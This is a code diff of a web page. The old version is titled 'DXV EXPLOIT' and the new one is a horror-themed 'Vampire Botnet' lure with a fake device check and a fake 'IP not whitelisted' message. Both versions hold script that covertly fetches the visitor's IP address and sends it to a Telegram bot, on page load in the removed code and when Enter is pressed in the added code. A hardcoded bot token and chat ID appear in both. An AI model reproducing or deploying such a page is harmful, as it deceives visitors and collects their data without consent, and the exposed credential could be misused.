@@ -1,49 +1,127 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
-    <title>DXV EXPLOIT</title>
-    <link href="../assets/toastr/toastr.min.css" rel="stylesheet" type="text/css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vampire Networks WebSocket</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=MedievalSharp&display=swap'); /* Importing a gothic-themed font */
+
         body {
-            background-color: black;
+            background-color: #000;
             color: white;
-            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'MedievalSharp', cursive; /* Applying horror-themed font */
+            text-align: center;
+            margin: 0;
+            overflow: hidden;
+            position: relative;
         }
-        .alert-danger {
-            color: red;
+        #initial-message, #whitelist-message, #checking-message {
+            font-size: 28px;
+            text-shadow: 2px 2px 5px rgba(255, 0, 0, 0.7);
         }
-        .alert-success {
-            color: lime;
+        #whitelist-message {
+            color: #ff0000; /* Red color for 'Your IP is not whitelisted' */
+            background: rgba(255, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #ff0000;
+            display: none;
+        }
+        #request-id {
+            display: block;
+            font-size: 16px;
+            margin-top: 10px;
+            color: #ff0000; /* Red color for Request ID */
+            font-weight: normal;
+        }
+        #checking-message {
+            color: #33ff33; /* Reddish-green color for 'System checking your browser...' */
+            background: rgba(0, 255, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #33ff33;
+            display: none;
+            animation: fade 2s ease-in-out infinite; /* Added fade animation */
+        }
+        .blood-splat {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: url('https://www.transparenttextures.com/patterns/blood.png') repeat;
+            z-index: -1;
+        }
+        @keyframes fade {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
         }
     </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const botToken = '6865521894:AAGvDoWy0kEHyC_GGGF9hoZzHsEEkwyxucY';
-                    const chatId = '5917899680';
-                    
-                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=IP Address: ${ipAddress}`;
-                    
-                    fetch(url);
-                });
-        });
-    </script>
 </head>
 <body>
-    <section id="main-content">
-        <section class="wrapper">
-            <div class="row">
-                <div class="alert alert-danger">
-                    <strong>Bypassed!</strong>
-                </div>
-            </div>
-        </section>
-    </section>
+    <div class="blood-splat"></div>
+    <div id="initial-message">Press Enter to connect to Vampire Botnet</div>
+    <div id="checking-message">
+         Checking your Device Information...
+    </div>
+    <div id="whitelist-message">
+        Your IP is not whitelisted
+        <div id="request-id"></div> <!-- Moved Request ID here -->
+    </div>
+
+    <script>
+        // Function to generate a random fake request ID
+        function generateRequestId() {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let requestId = '';
+            for (let i = 0; i < 16; i++) {
+                requestId += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return requestId;
+        }
+
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                // Hide initial message
+                document.getElementById('initial-message').style.display = 'none';
+
+                // Show checking message with fade animation
+                var checkingMessage = document.getElementById('checking-message');
+                checkingMessage.style.display = 'block';
+
+                // Generate and display a random request ID
+                const requestId = generateRequestId();
+
+                // After a 7-second delay, show "Your IP is not whitelisted" message with request ID
+                setTimeout(function() {
+                    checkingMessage.style.display = 'none'; // Hide checking message
+                    var whitelistMessage = document.getElementById('whitelist-message');
+                    whitelistMessage.style.display = 'block'; // Show whitelist message
+                    document.getElementById('request-id').textContent = 'Request ID: ' + requestId; // Show Request ID
+                }, 7000); // Wait for 7 seconds before showing the whitelist message
+
+                // Fetch IP address and send it to Telegram
+                fetch('https://api64.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipAddress = data.ip;
+                        const botToken = '6865521894:AAGvDoWy0kEHyC_GGGF9hoZzHsEEkwyxucY'; // Replace with your bot token
+                        const chatId = '5917899680'; // Replace with your chat ID
+
+                        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Detected IP Address: ${ipAddress}`;
+
+                        fetch(url);
+                    })
+                    .catch(error => console.error('Error fetching IP address:', error));
+            }
+        });
+    </script>
 </body>
 </html>
